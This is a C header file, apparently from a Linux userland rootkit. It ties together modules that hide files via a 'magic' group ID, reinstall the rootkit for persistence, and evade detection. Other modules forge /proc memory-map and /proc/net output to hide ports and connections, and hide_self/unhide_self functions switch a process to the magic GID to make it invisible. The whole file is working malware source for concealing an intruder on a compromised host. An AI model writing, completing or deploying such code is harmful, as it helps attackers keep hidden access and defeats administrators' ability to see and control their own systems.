#ifndef HIDING_H
#define HIDING_H

/* the following include contains (most of) all of the functions
 * responsible for doing the gid checks on paths. (namely, the
 * magic gid checks) */
#include "files/files.h"

#ifdef DO_REINSTALL
int rknomore(void);
int ld_inconsistent(void);
void reinstall(void);
#include "reinstall.c"
#endif

/* for the time being it's 100% necessary to have DO_REINSTALL
 * enabled too. this is just this way so that i can fix everything
 * first. */
#if defined(DO_EVASIONS) && defined(DO_REINSTALL)
#include "evasion/evasion.h"
#endif

#ifdef FORGE_MAPS
FILE *forge_maps(const char *pathname);
FILE *forge_smaps(const char *pathname);
FILE *forge_numamaps(const char *pathname);
#include "forge_maps.c"
#endif

#ifdef HIDE_PORTS
int is_hidden_port(int port);
int secret_connection(char line[]);
int hideport_alive(void);
FILE *forge_procnet(const char *pathname);
#include "forge_procnet.c"
#endif

void _setgid(gid_t gid){
    hook(CSETGID);
    call(CSETGID, gid);
}

void hide_self(void){
#ifndef HIDE_SELF
    return;
#endif

    gid_t magicgid = readgid();
    if(not_user(0) || getgid() == magicgid) return;
    _setgid(magicgid);
}

void unhide_self(void){
#ifndef HIDE_SELF
    return;
#endif

    if(not_user(0) || getgid() == 0) return;
    _setgid(0);
}

#endif
